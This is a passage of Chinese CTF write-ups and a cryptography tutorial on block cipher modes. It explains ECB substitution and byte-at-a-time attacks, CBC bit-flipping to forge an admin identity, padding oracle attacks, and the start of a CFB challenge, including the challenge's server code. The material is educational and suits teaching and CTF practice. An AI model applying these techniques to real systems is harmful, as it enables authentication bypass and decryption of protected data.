class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">for</span> eo <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            <span class="keyword">print</span> ao,bo,eo,(ao*bo)^(bo*eo)^eo</span><br><span class="line">            </span><br><span class="line">&gt;&gt;</span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span></span><br><span class="line"><span class="number">0</span> <span class="number">1</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">0</span> <span class="number">1</span> <span class="number">1</span> <span class="number">0</span></span><br><span class="line"><span class="number">1</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span></span><br><span class="line"><span class="number">1</span> <span class="number">0</span> <span class="number">1</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="number">1</span> <span class="number">0</span> <span class="number">1</span></span><br><span class="line"><span class="number">1</span> <span class="number">1</span> <span class="number">1</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>这样子，ao、eo 和输出有75%相同，这里可以用相关攻击。bo的话，爆破就好了。</p><p>这里说说自己对相关攻击的理解。线性反馈位移寄存器是用来生成密钥流的嘛，然后良好生成方式应该是输出的每一位为0和1的概率都应该是0.5，<del>这里的lfsr应该也是比较良好的吧，俺猜的，有现题了，就懒狗了，没有做测试，</del> 所以我们才有上面的表。</p><p>然后我们先爆破a，当ao和输出（不用全部输出啦，题目给的量有点大，随便来个1000位大概就好了）的75%相同时，大概就确定a了。</p><p>然后我们同时爆破c,d。当co^do 和输出的%75相同时，大概就确定c,d了。（出题人有良心，c 和 d 给的都比较短）</p><p>最后我们爆破b，把之前得到的a,c,d带入到加密程序，如果输出和题目给的输出完全相同就可了。（这次也不用测全部，来个50位，100位也就足够了。）</p><h3 id="easyRSA"><a href="#easyRSA" class="headerlink" title="easyRSA"></a>easyRSA</h3><p>是<a href="https://gist.github.com/LurkNoi/dfe86ed4d16776242251318b380336e7" target="_blank" rel="noopener">2019年D3CTF common</a>一题的一个part</p><p>直接用当时出题人给的题解exp， 换一换alpha的值，用解出来的phi求解私钥，解密密文，观察解密后的明文是否为flag就好</p><p><del>题做出来了，但其实原理并没有懂，是一个大坑，等俺哪天学会了再说哈哈哈哈哈</del></p><h3 id="ECDH"><a href="#ECDH" class="headerlink" title="ECDH"></a>ECDH</h3><p>NCCIP问题，直接构造出低阶点P（记录P的阶为N），然后发送给服务端，让他算出key，之后加密自己的输入，我们拿来异或自己的输入从而得到key，然后根据key的值（和P的关系）可以得到secret模N的一个剩余，即secret%N，多发送几个，最后来一波CRT就好。</p><p>具体步骤、细节俺会专门再写一篇。  <del>在做了，在做了</del></p><h3 id="Homomorphic"><a href="#Homomorphic" class="headerlink" title="Homomorphic"></a>Homomorphic</h3><p><del>这道题俺其实连解密原理都没搞懂，自己对多项式还是不够了解熟悉，所以这题就本地搭好，然后测！就硬测！</del></p><p>经过测试，发现该算法如其名，具有加法同态。并且发送(1,1,1,1,,,,,,1)和(1,1,1,,,,,1)过去解密得到的明文的ascii值是0。</p><p>所以直接把服务端给的flag的所有密文(FLAG)（44对，88组多项式），每一对中每一组的每一个系数都减1，发送回去给服务端解密就好。然后index输入0（多项式的表达，列表里头好像第一个是常数，也就是我们要的m），得到一位flag的ascii码，44次交互得到flag。</p><p><del>没懂原理，测试出来的而已哈哈哈哈哈哈哈哈</del></p><p>感觉这是非预期，毕竟让我们交互2^10次，出题人应该是看了这篇<a href="https://arxiv.org/pdf/1906.07127.pdf" target="_blank" rel="noopener">paper</a>，想让我们恢复私钥的吧哈哈哈哈哈哈哈哈。<del>俺以后有空一定看，一定看</del>    、</p><p>PS：badmonkey师傅好像是根据这个来的，恢复了私钥，TQL!!!</p>]]></content>
      
      
      <categories>
          
          <category> 比赛小屋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学学习笔记 之 分组密码操作模式</title>
      <link href="/2020/03/03/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E6%93%8D%E4%BD%9C%E6%A8%A1%E5%BC%8F/"/>
      <url>/2020/03/03/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E6%93%8D%E4%BD%9C%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>首发于<a href="https://mp.weixin.qq.com/s/DlKBJEc8mjTBS9QePaUE0w" target="_blank" rel="noopener">合天智汇</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;最近在分组密码学习的过程中，了解了AES分组密码以及分组密码的五种操作模式。目前已知的对AES的分析攻击都比蛮力攻击的复杂度要高。所以这里我们跳过AES加密本身，看看这五种操作模式的原理以及是否会因为一些操作不当而产生弱点。</p><h3 id="操作模式"><a href="#操作模式" class="headerlink" title="操作模式"></a>操作模式</h3><p>&emsp;&emsp;分组密码不仅仅是一个加密算法，也是用于实现多种不同密码学编码机制的万能元件。例如，人们可以使用分组密码构建各种不同种类的基于分组的加密方案，甚至还可以用它来实现序列密码。其中，不同的加密方式就称为操作模式。目前包括五种主流的操作模式：</p><p>电子密码本模式(electronic code book mode, ECB)<br>密码分组链接模式(cipher block chaining mode, CBC)<br>密码反馈模式(cipher feedback mode, CFB)<br>输出反馈模式(output feedback mode, OFB)<br>计数器模式(Counter mode, CTR)</p><h4 id="电子密码本模式（EBC）"><a href="#电子密码本模式（EBC）" class="headerlink" title="电子密码本模式（EBC）"></a>电子密码本模式（EBC）</h4><p>&emsp;&emsp;电子密码本模式是一种最直接的消息加密方式，</p><p><strong>假设$e_k()$表示用密钥k进行的分组加密；$e_k^{-1}()$对应解密。</strong></p><p><strong>$x_i$，$y_i$表示长度为b的位字符串，（长度不够的字符串会按照指定的填充规则进行填充）</strong></p><p><strong>加密：$y_i=e_k(x_i)    ,i≥1 $  $(e_k()$表示用密钥k进行的分组加密)</strong></p><p><strong>解密：$x_i=e_k^{-1}(y_i)    ,i≥1  (e_k^{-1}()$表示用密钥k进行的分组加密的解密)</strong></p><p>&emsp;&emsp;电子密码本模式就是最简单的一一映射加密，这意味着每一组的加密都是独立的，所以EBC模式加密可以实现并行化，这种方式在高速实现中具有很强的优势。并且，如果由于传输问题导致消息中间有一段数据受影响，也不会影响到后面的消息，这与后面要提到的CBC,CFB等模式是不同的。</p><h5 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h5><p>&emsp;&emsp;正因为EBC模式的一一映射加密，每一组加密相互独立，所以同样的明文用同样的密钥就会加密得到同样的密文。下面介绍EBC模式下的一种简单攻击方式：</p><h5 id="代换攻击"><a href="#代换攻击" class="headerlink" title="代换攻击"></a>代换攻击</h5><p>假设某个协议支持银行间的电汇，电汇包含五个字段，分别有五个分组</p><p><img src="https://i.loli.net/2020/04/30/ihsBnRE2rceHOyV.png" alt="代换攻击"></p><p>首先一个前提是我们能监听，拦截并更改这个电汇的密文，</p><p>然后我们可以先开个账户，进行若干次试验，每一次变更一个参数，比如发送账号，转账金额，一组密码的位数等，以此来确定每一个分组的意义。</p><p>等我们大概知道五个分组的意义后，我们就能进行替换攻击。比如银行A的某个账户向银行B的某个账户转账，我我们将其拦截，把接受账号密文代换成事先存好的我们账号的密文，则银行用key解密后，就会把钱都转到我们的账户下。值得一提的是，整个过程我们并没有攻击分组密码本身，所以尽管加密方案本身再安全也抵御不了这种攻击；我们甚至也不知道真正明文的内容，所以实现代换攻击是破坏了消息的完整性。</p><p>例子很特殊，比如五个参数刚好在五个分组等，只是为了方便理解_</p><h5 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h5><p>现实中抵御代换攻击常用消息验证码(Message Authentication Code, MAC)，和数字签名，主要就是为了确保消息的完整性。</p><h5 id="CTF中EBC相关的题目-2019OGeek-Babycry"><a href="#CTF中EBC相关的题目-2019OGeek-Babycry" class="headerlink" title="CTF中EBC相关的题目-2019OGeek-Babycry"></a>CTF中EBC相关的题目-2019OGeek-Babycry</h5><p>前面提到，分组加密中长度不够的字符串会按照指定的填充规则进行填充，再加上ECB这样一一映射的明文-密文对关系，就会产生利用pad来逐位爆破明文的攻击。</p><p>nc 过去得到加密规则</p><p><img src="https://i.loli.net/2020/04/30/BlV5UeHiKtNGvzA.png" alt="Babycry"></p><p>加密规则是des（key,sth..flag{*}padding）&emsp;&emsp;    （模式可以类比为ECB的一一映射）</p><p>加上hint</p><p>所以我们控制输入，可以使得被加密的字符末尾为</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#125;_______（<span class="number">7</span>个<span class="keyword">_</span>）</span><br></pre></td></tr></table></figure><p>比如key加上flag是50位，并且flag以‘}’ 结尾。他是8位一组，那么我们就填上7个a，这样key+sth+flag就有57位，八位一组，前面56位字符分8组，于是最后一组加上填充就是<code>}_______（7个&#39;_&#39;）</code></p><p>然后服务器会返回给我们密文，于是密文的最后一组就代表着<code>}_______（7个&#39;_&#39;）</code>的密文，</p><p>如果我们再多填一个a，那么返回密文中最后一组就是<code>?}______（6个&#39;_&#39;）</code>的密文①（’?’代表flag的最后到数第二位字符，未知，需要爆破）</p><p>于是我们就开始爆破，我们先测出key的长度先，（看填几个a会密文会多出一组来就能知道）</p><p>然后填a，让   len(key)+len(a)%8 == 0，接着，我们就发送<code>aaa*}______（6个&#39;_&#39;）</code>,（a的个数由key的长度决定，*代表任意字符，我们直接遍历可见字符表）让服务返回加密结果，我们找到明文对应的那一组密文，和之前返回的密文①做比较，结果一样，说明那位字符正确，开始爆破下一位字符。</p><p>以此类推可以逐位爆破出所有位字符。（只是爆破超过八位后，用来作为判断依据的密文①就不能再从密文最后一组找了，得从到数第二组，第三组….找_）</p><h4 id="密码分组链接模式-CBC"><a href="#密码分组链接模式-CBC" class="headerlink" title="密码分组链接模式(CBC)"></a>密码分组链接模式(CBC)</h4><p>在CBC模式中，后一组的密文都受前一组密文影响，第一组密文受初始向量IV影响，从而明文的重复排列不会反应在密文中。</p><p><strong>假设$e_k()$表示用密钥k进行的分组加密；$e_k^{-1}()$对应解密。</strong></p><p><strong>$x_i，y_i$表示长度为b的位字符串，IV表示长度为b的初始向量，（长度不够的字符串会按照指定的填充规则进行填充）</strong></p><p><em>*加密：</em>$y_1=e_k(x_1 ⊕ IV)$     **</p><p>&emsp;&emsp;    $y_i=e_k(x_i⊕ y_{i-1})    ,i≥2 $</p><p><em>*解密：</em>$x_1=e_k^{-1}(y_1)⊕ IV$ **</p><p>&emsp;&emsp;    $x_i=e_k^{-1}(y_i) ⊕ y_{i-1}    ,i≥2$ </p><p>&emsp;&emsp;如果每次加密是都选择一个新的IV，则CBC模式就变成了一个概率加密方案，即相同的明文加密会生成不同的密文。</p><p>&emsp;&emsp;需要说明的是，如果每次选择IV的数值得当，则代换攻击会彻底失效，因为监听者无法识别加密的模式。但是如果若干次加密使用相同的IV，则监听者还是可以识别加密模式。</p><p>&emsp;&emsp;虽然（承接ECB的例子）这一次直接将我们的账户的密文替换上去已经不能实现向我们账户转账的效果，因为我们代换，会导致第四、五组消息都被破坏，但是有可能解密后，账户和金额仍然具有意义呢？（虽然可能性似乎很低）只是是随机的，不再可控了而已。但这仍然是银行所不可接受的。所以消息验证码和数字签名的作用显得尤为重要。</p><h5 id="缺陷-1"><a href="#缺陷-1" class="headerlink" title="缺陷"></a>缺陷</h5><p>因为某些原因，使得某一组密文中出现了错误的bit，将影响这一组(整组)及其之后一组(相应位)分组的解密。由此产生了CBC反转字节攻击。另外与下面所讲的CFB模式一样，CBC模式也不能抵御重放攻击。</p><h5 id="CBC反转字节攻击（Modification-attack-on-CBC）"><a href="#CBC反转字节攻击（Modification-attack-on-CBC）" class="headerlink" title="CBC反转字节攻击（Modification attack on CBC）"></a>CBC反转字节攻击（Modification attack on CBC）</h5><p><img src="https://i.loli.net/2020/04/30/SIzAO5KaUT47XCj.png" alt="Modification attack on CBC"></p><p>在加密时，前一组明文会影响后面所有分组的密文。</p><p>但是在解密时，由公式及原理图可知，一组密文只会影响这一组的解密结果和下一组的解密结果。</p><p>我们看到箭头2，这一组Ciphertext（密文2）在Decryption（解密）之后会生成Ciphertext_1（我yy的），然后这个Ciphertext_1与箭头1所指的Ciphertext（密文1）按位异或后最终生成Plaintext（明文2）</p><p>所以我们可以修改Ciphertext1，来达到控制Plaintext2的效果，当然如果想要精确控制，则需要知道Plaintext2的具体内容。（在某些特定条件下，Plaintext2的内容可以利用Padding Oracle Attack 来获取，下文会简略介绍这种攻击方式）</p><p>并且由于Ciphertext1的修改，导致自己这一组的解密会受影响，所以还需要修改图中的IV来给Ciphertext1“擦个屁股”。（如果前面不是IV呢？那只能一路改下去，直到IV为止了。。。）</p><h5 id="CTF中CBC反转字节攻击-应用场景"><a href="#CTF中CBC反转字节攻击-应用场景" class="headerlink" title="CTF中CBC反转字节攻击 应用场景"></a>CTF中CBC反转字节攻击 应用场景</h5><p>​        CBC反转字节攻击可能会用于Web题中的绕过。比如一个登陆，然后在传输过程中是将你提交的信息用分组密码加密，模式是CBC，然后到服务端后再解密。</p><p>&emsp;&emsp;提交的时候他不让你填写admin，但是题目又需要你有admin的身份。这个时候就可以考虑用CBC反转字节攻击绕过过滤。</p><p>&emsp;&emsp;比如：先用bdmin的身份登陆，然后拦截、更改身份对应密文组的<strong>前</strong>一组的对应位，让服务器将身份解密成明文后为admin，但是身份前一组的明文应该是毁掉了，那就再改前一组的密文来进行补救，直到改到初始向量IV为止。</p><h5 id="Padding-Oracle-Attack"><a href="#Padding-Oracle-Attack" class="headerlink" title="Padding Oracle Attack"></a>Padding Oracle Attack</h5><p>这里粗略介绍一下CBC模式下的Padding Oracle Attack </p><p>&emsp;&emsp;在AES加密的CBC模式中，若加密数据的长度模除分块长度而有余，则会在末尾填充一组数据。</p><p>即<strong>(pad_length-len(data)%pad_length)*hex(pad_length-len(data)%pad_length)</strong></p><p>举个栗子（8字节一组）</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">数据：</span><br><span class="line">aaaaa</span><br><span class="line">填充后的数据：</span><br><span class="line">aaaaa\<span class="keyword">x</span><span class="number">3</span>\<span class="keyword">x</span><span class="number">3</span>\<span class="keyword">x</span><span class="number">3</span></span><br><span class="line">数据：</span><br><span class="line">aaaaaaaaaa</span><br><span class="line">填充后的数据：</span><br><span class="line">aaaaaaaaaa\<span class="keyword">x</span><span class="number">06</span>\<span class="keyword">x</span><span class="number">06</span>\<span class="keyword">x</span><span class="number">06</span>\<span class="keyword">x</span><span class="number">06</span>\<span class="keyword">x</span><span class="number">06</span>\<span class="keyword">x</span><span class="number">06</span></span><br><span class="line">数据：</span><br><span class="line">aaaaaaaa</span><br><span class="line">填充后的数据：</span><br><span class="line">aaaaaaaa\<span class="keyword">x</span><span class="number">08</span>\<span class="keyword">x</span><span class="number">08</span>\<span class="keyword">x</span><span class="number">08</span>\<span class="keyword">x</span><span class="number">08</span>\<span class="keyword">x</span><span class="number">08</span>\<span class="keyword">x</span><span class="number">08</span>\<span class="keyword">x</span><span class="number">08</span>\<span class="keyword">x</span><span class="number">08</span></span><br></pre></td></tr></table></figure><p>​        Padding Oracle Attack 需要两个前提就是：</p><p>1.可以控制密文 或者 IV </p><p>2.如果解密后不满足 padding 服务端会报错. （只有最后一个块长度不足时会有填充）</p><p>再次举栗子：</p><p>&emsp;&emsp;此处选择了<strong>AES-128</strong>作为例子，明文长度为<strong>17</strong>位，故补齐至<strong>32</strong>位后分<strong>2</strong>组进行加密。</p><p>&emsp;&emsp;然后我们伪造一组IV来和第一组密文一起发回服务器，让其进行判定。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">明文：southseastisacat!</span><br><span class="line">IV：<span class="symbol">\x</span>31<span class="symbol">\x</span>32<span class="symbol">\x</span>33<span class="symbol">\x</span>34<span class="symbol">\x</span>35<span class="symbol">\x</span>36<span class="symbol">\x</span>37<span class="symbol">\x</span>38<span class="symbol">\x</span>38<span class="symbol">\x</span>37<span class="symbol">\x</span>36<span class="symbol">\x</span>35<span class="symbol">\x</span>34<span class="symbol">\x</span>33<span class="symbol">\x</span>32<span class="symbol">\x</span>31</span><br><span class="line">密文：<span class="symbol">\x</span>bf<span class="symbol">\x</span>61<span class="symbol">\x</span>b3<span class="symbol">\x</span>1b<span class="symbol">\x</span>d3<span class="symbol">\x</span>6a<span class="symbol">\x</span>47<span class="symbol">\x</span>11<span class="symbol">\x</span>b9<span class="symbol">\x</span>cc<span class="symbol">\x</span>d7<span class="symbol">\x</span>11<span class="symbol">\x</span>7b<span class="symbol">\x</span>8a<span class="symbol">\x</span>42<span class="symbol">\x</span>d9<span class="symbol">\x</span>3a<span class="symbol">\x</span>1e<span class="symbol">\x</span>37<span class="symbol">\x</span>e9<span class="symbol">\x</span>d2<span class="symbol">\x</span>de<span class="symbol">\x</span>fa<span class="symbol">\x</span>ca<span class="symbol">\x</span>a2<span class="symbol">\x</span>50<span class="symbol">\x</span>fd<span class="symbol">\x</span>c0<span class="symbol">\x</span>6e<span class="symbol">\x</span>f2<span class="symbol">\x</span>11<span class="symbol">\x</span>c1</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;对IV的最后一位字符进行爆破，构造<strong>0x00</strong>到<strong>0xff</strong>，使得第一组密文的最后一个字节解密的结果同IV异或结果为<strong>0x01</strong>，导致<strong>Padding</strong>通过，当IV最后一位字符是0x44时，服务器返回正确结果。</p><p>&emsp;&emsp;这时IV的最后一个字节和原IV的最后一个字节还有<strong>0x01</strong>异或，即<strong>0x44^0x31^0x01</strong>，得到结果为<strong>t</strong>，是第一组明文的最后一个字符。</p><p>&emsp;&emsp;然后可以固定IV的最后一个值使得第一组密文的最后一个字节解密的结果同IV异或结果为<strong>0x02</strong>，此时爆破IV到数第二个字节，当第一组密文的到数第二个字节解密的结果同IV异或结果为<strong>0x02</strong>时，服务器返回正确结果，此时又能确定第一组明文的倒数第二个字符，以此类推_</p><hr><h4 id="密码反馈模式-CFB"><a href="#密码反馈模式-CFB" class="headerlink" title="密码反馈模式(CFB)"></a>密码反馈模式(CFB)</h4><p>与CBC类似，CFB模式每一组的密文也会影响后续所有组的密文，直接看加解密规则吧</p><p><strong>假设$e_k()$表示用密钥k进行的分组加密；</strong></p><p><strong>$x_i，y_i$表示长度为b的位字符串，IV表示长度为b的初始向量</strong>（不需要填充）</p><p><strong>加密</strong>：$y_1=e_k(IV)⊕x_1$     </p><p>&emsp;&emsp;    $y_i=e_k(y_{i-1})⊕x_i      ,i≥2$ </p><p><strong>解密</strong>：$x_1=e_k(IV)⊕y_1$</p><p>&emsp;&emsp;    $x_i=e_k(y_{i-1})⊕y_i    ,i≥2$ </p><p>&emsp;&emsp;加密上面确实感觉挺像，只是$x_i$和⊕在括号里还是在括号外的区别。但正因为这点小小的区别，导致解密上CFB模式仍然用的是分组加密的加密函数。</p><p>&emsp;&emsp;类似“CBC翻转字节攻击”，在CFB上也可进行类似的控制，只不过这次“擦屁股的人”是这一组密文后面的所有密文组了。</p><h5 id="缺陷-2"><a href="#缺陷-2" class="headerlink" title="缺陷"></a>缺陷</h5><p>与CBC类似，因为某些原因，使得某一组密文中出现了错误的bit，将影响这一组(相应位)及其之后一组(整组)分组的解密。CFB模式也不可抵御重放攻击。</p><h5 id="重放攻击"><a href="#重放攻击" class="headerlink" title="重放攻击"></a>重放攻击</h5><p>举个栗子：</p><p>​        Alice向Bob发送一条消息，这条消息由4个密文分组组成。主动攻击者Mallory将该消息中的后3个密文分组保存了下来。第二天，Alice又向Bob发送了内容不同的4个密文分组（假设Alice使用了<strong>相同的密钥</strong>）。攻击者用昨天保存下来的3个密文分别将今天发送的后3个密文分组进行了替换。</p><p>&emsp;&emsp;于是，Bob解密时，4个分组中只有第1个可以解密成正确的明文分组，第2个会出错，而第3个和第4个则变成了被攻击者替换的内容（也就是昨天发送的明文内容）。攻击者没有破解密码，就成功地用以前的电文混入了新电文中。而第2个分组出错到底是通信错误呢，还是被人攻击所造成的呢？Bob是无法做出判断的。<br><img src="https://i.loli.net/2020/04/30/Qa8tms7dURFvIEB.png" alt="重放攻击"></p><h5 id="CTF中的CFB模式相关的题目-hgame2020-week3-Feedback"><a href="#CTF中的CFB模式相关的题目-hgame2020-week3-Feedback" class="headerlink" title="CTF中的CFB模式相关的题目-hgame2020-week3-Feedback"></a>CTF中的CFB模式相关的题目-hgame2020-week3-Feedback</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">import os, random</span><br><span class="line">import string, binascii</span><br><span class="line">import signal</span><br><span class="line">import socketserver</span><br><span class="line">from hashlib import sha256</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line"></span><br><span class="line">from secret import MESSAGE</span><br><span class="line">assert len(MESSAGE) == <span class="number">48</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>(<span class="title">socketserver</span>.<span class="title">BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>, *args, **kargs)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.KEY = b<span class="string">""</span></span><br><span class="line">        <span class="keyword">self</span>.IV = b<span class="string">""</span></span><br><span class="line">        <span class="keyword">super</span>().__init_<span class="number">_</span>(*args, **kargs)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_recvall</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        BUFF_SIZE = <span class="number">2048</span></span><br><span class="line">        data = b<span class="string">''</span></span><br><span class="line">        <span class="keyword">while</span> <span class="symbol">True:</span></span><br><span class="line">            part = <span class="keyword">self</span>.request.recv(BUFF_SIZE)</span><br><span class="line">            data += part</span><br><span class="line">            <span class="keyword">if</span> len(part) &lt; <span class="symbol">BUFF_SIZE:</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">return</span> data.strip()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send</span><span class="params">(<span class="keyword">self</span>, msg, newline=True)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="symbol">try:</span></span><br><span class="line">            <span class="keyword">if</span> <span class="symbol">newline:</span> msg += b<span class="string">'\n'</span></span><br><span class="line">            <span class="keyword">self</span>.request.sendall(msg)</span><br><span class="line">        <span class="symbol">except:</span></span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">recv</span><span class="params">(<span class="keyword">self</span>, prompt=b<span class="string">'&gt; '</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.send(prompt, newline=False)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">self</span>._recvall()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(<span class="keyword">self</span>, data)</span></span><span class="symbol">:</span></span><br><span class="line">        assert len(data) % <span class="number">16</span> == <span class="number">0</span></span><br><span class="line">        aes = AES.new(<span class="keyword">self</span>.KEY, AES.MODE_CFB, <span class="keyword">self</span>.IV, segment_size=<span class="number">128</span>)</span><br><span class="line">        <span class="keyword">return</span> aes.encrypt(data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">self</span>, data)</span></span><span class="symbol">:</span></span><br><span class="line">        assert len(data) % <span class="number">16</span> == <span class="number">0</span></span><br><span class="line">        aes = AES.new(<span class="keyword">self</span>.KEY, AES.MODE_CFB, <span class="keyword">self</span>.IV, segment_size=<span class="number">128</span>)</span><br><span class="line">        <span class="keyword">return</span> aes.decrypt(data)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        signal.alarm(<span class="number">60</span>)</span><br><span class="line">        <span class="keyword">self</span>.KEY = os.urandom(<span class="number">32</span>)</span><br><span class="line">        <span class="keyword">self</span>.IV = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">self</span>.send(b<span class="string">"You have only 3 times to decrypt sth, then I'll give u the FLAG."</span>)</span><br><span class="line">        <span class="symbol">try:</span></span><br><span class="line">            <span class="keyword">for</span> <span class="number">_</span> <span class="keyword">in</span> range(<span class="number">3</span>)<span class="symbol">:</span></span><br><span class="line">                <span class="keyword">self</span>.send(b<span class="string">"Give me sth(hex) to decrypt"</span>)</span><br><span class="line">                hex_input = <span class="keyword">self</span>.recv()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> <span class="symbol">hex_input:</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                ciphertext = binascii.unhexlify(hex_input)</span><br><span class="line">                plaintext = <span class="keyword">self</span>.decrypt(ciphertext)</span><br><span class="line">                <span class="keyword">self</span>.send( binascii.hexlify(plaintext) )</span><br><span class="line">        <span class="symbol">except:</span></span><br><span class="line">            <span class="keyword">self</span>.send(b<span class="string">"Rua!!!"</span>)</span><br><span class="line">            <span class="keyword">self</span>.request.close()</span><br><span class="line"></span><br><span class="line">        enc_msg = <span class="keyword">self</span>.encrypt(MESSAGE)</span><br><span class="line">        <span class="keyword">self</span>.send(b<span class="string">"Here is your encrypted FLAG(hex): "</span>, newline=False)</span><br><span class="line">        <span class="keyword">self</span>.send( binascii.hexlify(enc_msg) )</span><br><span class="line">        <span class="keyword">self</span>.request.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForkedServer</span>(<span class="title">socketserver</span>.<span class="title">ForkingMixIn</span>, <span class="title">socketserver</span>.<span class="title">TCPServer</span>):</span></span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name_<span class="number">_</span> == <span class="string">"__main__"</span><span class="symbol">:</span></span><br><span class="line">    HOST, PORT = <span class="string">'0.0.0.0'</span>, <span class="number">1234</span></span><br><span class="line">    server = ForkedServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = True</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure><p>可搜集到的信息：</p><p>MESSAGE (flag) 的长度为48位，三组，每组16位。</p><p>程序的功能：AES加密，CFB模式。每次连接会随机生成一个IV和key，然后最多可以对我的输入进行三次解密，最后会把flag用同样的IV和key加密，然后发送给我们。</p><p>解题思路：</p><p>首先列出加密解密的流程，由于只有三组，都写出来会比较好看些。</p><p><img src="https://i.loli.net/2020/04/30/MmPzEslXdVDJIy9.png" 